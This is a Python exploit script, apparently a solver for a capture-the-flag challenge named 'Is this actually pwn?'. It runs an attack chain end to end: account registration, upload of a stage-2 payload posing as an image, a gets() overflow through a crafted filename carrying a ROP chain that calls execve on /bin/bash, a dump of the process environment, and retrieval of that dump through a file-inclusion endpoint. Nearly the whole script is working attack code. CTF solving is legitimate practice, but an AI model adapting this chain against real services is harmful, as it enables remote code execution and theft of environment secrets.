#!/usr/bin/env python3
"""Solver for "Is this actually pwn?" (EsiMedia).

Usage: python3 solve.py <base-url> [path-to-crop_image]
  e.g. python3 solve.py https://is-this-actually-pwn-<uid>.challs.ingeniums.club:9450
       python3 solve.py http://127.0.0.1:5000

Chain: register -> login -> upload stage-2 as a temp "image" -> /crop_and_save
with a crafted filename (ROP overflow of gets(output_file), offset 280) ->
read(3, bss, 0x50) pulls stage-2 from the uploaded file -> execve("/bin/bash",
"-c", "env > /app/instance/temp_flag.txt") -> flag exfiltrated via the LFI
(/serve_file?filename=temp_flag.txt).
"""
import os
import re
import sys
import time

import requests
import urllib3
from pwn import *

urllib3.disable_warnings()
context.log_level = "error"

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
BIN = sys.argv[2] if len(sys.argv) > 2 else os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "src", "static", "profile_pics", "crop_image")
context.binary = elf = ELF(BIN)
rop = ROP(elf)

# Writable (bss page) and every byte < 0x80 / != 0x0a, so the payload survives
# the app's text=True (UTF-8) stdin pipe and gets().
BSS = 0x404100

s = requests.Session()
s.verify = False if BASE.startswith("https") else True

user = "pwn%d" % int(time.time())
r = s.post(BASE + "/register", data={"username": user, "full_name": "Pwn", "password": "pass123"})
assert r.status_code == 200, r.status_code
r = s.post(BASE + "/login", data={"username": user, "password": "pass123"}, allow_redirects=False)
assert r.status_code == 302, r.status_code
print("[+] logged in as", user)

# Stage 2: read from fd 3 (the uploaded temp file) by the ROP read() call.
# The ROP execve passes envp=0, so the shell's own env is empty — read the
# flag from the app process (PID 1) instead.
cmd = b"/bin/bash\x00-c\x00cat /proc/1/environ>/app/instance/temp_flag.txt\x00"
stage2 = (cmd + p64(BSS) + p64(BSS + len(b"/bin/bash\x00"))
          + p64(BSS + len(b"/bin/bash\x00-c\x00")) + p64(0))

r = s.post(BASE + "/upload_temp_image",
           files={"temp_image": ("stage2.bin", stage2, "application/octet-stream")})
temp_name = r.json()["filename"]
print("[+] uploaded stage-2 as", temp_name)

# ROP chain placed at offset 280 of the second stdin line
# (line 2 = '/app/instance/out_cropped_' + filename).
read_call = flat([rop.rax.address, 0,
                  rop.rdi.address, 3,
                  rop.rsi.address, BSS,
                  rop.rdx.address, 0x100,
                  rop.syscall.address])
rop_payload = flat([read_call,
                    rop.rax.address, 59,
                    rop.rdi.address, BSS,
                    rop.rsi.address, BSS + len(cmd),
                    rop.rdx.address, 0,
                    rop.syscall.address,
                    elf.symbols.main])
assert all(b < 0x80 and b != 0x0A for b in rop_payload), "payload byte unsafe for utf-8 pipe"

prefix2 = "/app/instance/out_cropped_"
pad = 280 - len(prefix2) - len(temp_name) - 1
assert pad > 0
filename_payload = temp_name + "\x00" + "A" * pad + rop_payload.decode("ascii")

r = s.post(BASE + "/crop_and_save",
           json={"filename": filename_payload, "x": "0", "y": "0", "width": "100", "height": "100"},
           timeout=90)
print("[+] crop_and_save:", r.status_code)

r = s.get(BASE + "/serve_file", params={"filename": "temp_flag.txt"})
m = re.search(rb"RCTF_FLAG=([^\x00\n]+)", r.content)
if not m:
    print("[-] no flag in exfil response:", r.text[:300])
    sys.exit(1)
print("[+] FLAG:", m.group(1).decode())
